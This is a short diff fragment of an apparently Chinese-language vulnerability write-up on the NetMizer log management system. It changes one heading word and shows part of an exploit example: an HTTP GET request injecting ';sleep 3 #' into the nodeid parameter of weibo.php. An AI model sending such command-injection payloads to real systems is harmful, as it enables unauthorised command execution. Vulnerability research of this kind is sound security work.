@@ -77,7 +77,7 @@ NetMizer日志[管理系统](#)是一款专为网络流量管理和优化设计�
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-计算机科学
+操作系统
 
 ```
 GET /data/search/weibo.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
